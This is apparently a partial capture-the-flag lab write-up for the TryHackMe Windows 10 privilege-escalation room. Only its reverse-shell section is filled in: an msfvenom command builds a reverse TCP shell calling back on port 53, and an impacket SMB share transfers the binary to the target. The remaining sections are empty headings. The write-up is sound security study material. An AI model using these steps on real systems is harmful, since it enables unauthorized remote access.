# Windows 10 Priv Esc room From TryHackMe

[1. Intro](#intro)

[2. Generating a Reverse Shell Executable](#generating-a-reverse-shell-executable)

[3. Service Exploits - Insecure Service Permissions](#service-exploits---insecure-service-permissions)

[4. Service Exploits - Unquoted Service Path](#service-exploits---unquoted-service-path)

[5. Service Exploits - Weak Registry Permissions](#service-exploits---weak-registry-permissions)

[6. Service Exploits - Insecure Service Executables](#service-exploits---insecure-service-executables)

[7. Registry - AutoRuns](#registry---autoruns)

[8. Registry - AlwaysInstallElevated](#registry---alwaysinstallelevated)

[9. Passwords - Registry](#passwords---registry)

[10. Passwords - saved creds](#passwords---saved-creds)

[11. Passwords - Security Account Manager (SAM)](#passwords---security-account-manager-sam)

[12. Passwords - Passing the Hash](#passwords---passing-the-hash)

[13. Scheduled Tasks](#scheduled-tasks)

[14. Insecure GUI Apps](#insecure-gui-apps)

[15. Startup Apps](#startup-apps)

[16. Token Impersonation - Rogue Potato](#token-impersonation---rogue-potato)

[17. Token Impersonation - PrintSpoofer](#token-impersonation---printspoofer)

[18. Privilege Escalation Scripts](#privilege-escalation-scripts)

## Intro

`xfreerdp /u:user /p:password321 /cert:ignore /v:MACHINE_IP`

![image](https://user-images.githubusercontent.com/83407557/181599686-6ed867b0-25b4-47b1-8994-6fda5b5b3e36.png)
*image source https://tryhackme.com/room/windows10privesc*

## Generating a Reverse Shell Executable

The first step is going to be to create a reverse shell executable using msfvenom. Then I need to transfer this binary over to the target machine. The authors of this room have you transfer this file via SMB. However there are other ways of doing this, that I will also show here. They include, transfering the binary via FTP, netcat, exe2hex, and http. Depending on the firewalls certain ports may not be available, having multiple ways to transfer your files in your virtual tool belt is always a good thing.

### Creating reverse.exe

We need to know our ipv4 address on the tryhackme VPN before we can craft our revshell. Also in the example the author uses port 53 as the listening port. This is the port normally used by DNS, we may be using this for firewall reasons or because it is a good port to hide traffic, in any case I will be keeping it the same for my binary.

![image](https://user-images.githubusercontent.com/83407557/181602930-78389fa7-8de1-4d9c-bfb0-821e62fb4b48.png)*getting ipv4 address on THM vpn*

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.77.38 LPORT=53 -f exe -o reverse.exe`

![image](https://user-images.githubusercontent.com/83407557/181603375-da05a314-7e5a-43ed-ac1b-ae194ac8bd25.png)*Creating binary with msfvenom*

### Transfering reverse.exe Via SMB (The authors way)

Using the smb server from the impacket tool kit, from kali linux the following command can spin up an SMB share in the current directory with the following command:

`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`

Then from the windows 10 RDP session, in a cmd terminal the copy command can be used to get a file from our SMB kali share:

`copy\\<kali ip>\kali\<file> <writable path on Windows>`  

![image](https://user-images.githubusercontent.com/83407557/181866236-da7538f9-95c2-42a2-a948-8f914f7ef448.png)

To test that it worked, start a netcat listener on port 53 and test the binary.

![image](https://user-images.githubusercontent.com/83407557/181866273-128d0611-d2b5-415c-9851-7a7548a9ef6c.png)

### Transfering reverse.exe Via HTTP






## Service Exploits - Insecure Service Permissions
## Service Exploits - Unquoted Service Path
## Service Exploits - Weak Registry Permissions
## Service Exploits - Insecure Service Executables
## Registry - AutoRuns
## Registry - AlwaysInstallElevated
## Passwords - Registry
## Passwords - saved creds
## Passwords - Security Account Manager (SAM)
## Passwords - Passing the Hash
## Scheduled Tasks
## Insecure GUI Apps
## Startup Apps
## Token Impersonation - Rogue Potato
## Token Impersonation - PrintSpoofer
## Privilege Escalation Scripts
